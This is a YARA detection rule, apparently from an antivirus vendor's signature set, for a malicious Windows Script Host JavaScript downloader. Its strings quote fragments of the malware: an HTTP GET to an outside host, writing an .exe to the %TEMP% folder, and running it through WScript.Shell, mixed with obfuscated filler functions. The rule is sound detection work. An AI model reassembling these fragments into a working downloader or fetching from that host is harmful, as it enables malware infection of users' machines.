rule sig_20160328_19f350fed58a8d70245f594b3f22d873 {
  meta:
    description = "datamaliciousorder - file 20160328_19f350fed58a8d70245f594b3f22d873.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f381e09f8222c51f9943739ce7fdcd8d072805a34a676bb3d4afd23396d7a866"

  strings:
    $s1  = "function Xtepkj() {return Yexpgmyrh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"aRMw3HHv.exe\";};" fullword ascii
    $s2  = "do {WScript[Zyrjepjub](Fkzmq() * 11)} while (Eqavtjbt[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Yexpgmyrh = function Brlrsho() {return WScript[Hqhhs](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Lkaykfe(Gbznqszdwt, Taebohwy){return Gbznqszdwt - Taebohwy;};" fullword ascii
    $s5  = "Eqavtjbt[Ddznnmzas](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s6  = "function Xqgjmqfhaa() {return ((Cmsvpzao == true) && (Cmsvpzao == Nfmvwmand)) ? 1 : Tsrxcywz;};" fullword ascii
    $s7  = "function Jrefao(Irlninf){Yexpgmyrh[\"Run\"](Irlninf, Tsrxcywz, Tsrxcywz);};" fullword ascii
    $s8  = "function Opcpqhy()" fullword ascii
    $s9  = " while (Hikyjsy){" fullword ascii
    $s10 = "var Qryple = new this[\"Date\"]();" fullword ascii
    $s11 = "function Hplqvnmcdm(Gevshkpi) {var Qyiaevdg = (1, 2, 3, 4, 5, Gevshkpi); return Qyiaevdg;};" fullword ascii
    $s12 = "var Esukmcpcr = false;" fullword ascii
    $s13 = "return Lkaykfe(Zlvaxdrtrv, Qpyioknc);" fullword ascii
    $s14 = "var Cmsvpzao = false;" fullword ascii
    $s15 = "Cmsvpzao = true; " fullword ascii
    $s16 = "function Fkzmq(){return 22;};" fullword ascii
    $s17 = "var Nfmvwmand = false;" fullword ascii
    $s18 = "function Evtsf(){return Hqhhs;};" fullword ascii
    $s19 = "function Ddmwv(){return Vplgbvrcbo;};" fullword ascii
    $s20 = "Nfmvwmand = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}